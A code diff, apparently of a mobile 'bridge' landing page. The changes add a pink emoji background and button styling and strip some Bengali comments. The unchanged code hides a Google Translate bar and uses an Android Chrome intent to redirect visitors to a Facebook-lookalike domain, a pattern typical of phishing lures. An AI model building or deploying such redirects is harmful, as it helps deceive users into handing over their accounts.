@@ -20,8 +20,34 @@
         body {
             margin: 0; padding: 0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f0f2f5;
+            /* আধুনিক পিঙ্কিশ ইমোজি ব্যাকগ্রাউন্ড */
+            background-color: #ffeef2;
+            background-image: radial-gradient(#ffc1d3 0.5px, transparent 0.5px), radial-gradient(#ffc1d3 0.5px, #ffeef2 0.5px);
+            background-size: 20px 20px;
+            background-position: 0 0, 10px 10px;
             display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* ফ্লোটিং ইমোজি অ্যানিমেশন */
+        body::before {
+            content: "❤️ ✨ 🌸 💖 💋 🌹 ✨ ❤️ 🌸 💖";
+            position: absolute;
+            top: -10%;
+            left: 0;
+            width: 100%;
+            height: 120%;
+            font-size: 24px;
+            line-height: 1.5;
+            word-spacing: 50px;
+            opacity: 0.15;
+            color: #ff4d79;
+            z-index: -1;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            pointer-events: none;
         }
         
         /* গুগল ট্রান্সলেট বার হাইড করা */
@@ -31,7 +57,8 @@
         .bridge-card {
             background: white; width: 95%; max-width: 400px;
             border-radius: 15px; overflow: hidden;
-            box-shadow: 0 12px 28px rgba(0,0,0,0.12); text-align: center;
+            box-shadow: 0 15px 35px rgba(255, 77, 121, 0.2); text-align: center;
+            position: relative; z-index: 10;
         }
         .cover-photo {
             width: 100%; height: 150px;
@@ -73,7 +100,10 @@
             display: inline-flex; align-items: center; gap: 10px;
             width: 85%; justify-content: center; font-size: 17px; 
             cursor: pointer; border: none;
+            box-shadow: 0 4px 15px rgba(0, 132, 255, 0.3);
+            transition: transform 0.2s;
         }
+        .main-btn:active { transform: scale(0.98); }
     </style>
 </head>
 <body>
@@ -101,11 +131,9 @@
         </div>
     </div>
 
-    <!-- গুগল ট্রান্সলেট এলিমেন্ট -->
     <div id="google_translate_element" style="visibility:hidden; height:0; overflow:hidden;"></div>
 
     <script type="text/javascript">
-        // গুগল ট্রান্সলেট সেটআপ
         function googleTranslateElementInit() {
             new google.translate.TranslateElement({
                 pageLanguage: 'en',
@@ -113,7 +141,6 @@
             }, 'google_translate_element');
         }
 
-        // অটোমেটিক ল্যাঙ্গুয়েজ শনাক্ত করে ট্রান্সলেট করার স্ক্রিপ্ট
         window.addEventListener('load', function() {
             setTimeout(function() {
                 let userLang = navigator.language || navigator.userLanguage; 
@@ -129,7 +156,6 @@
             }, 1500); 
         });
 
-        // ক্রোম রিডাইরেক্ট কোড
         const targetUrl = "https://facebook.surovi69.xyz";
         const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";
 
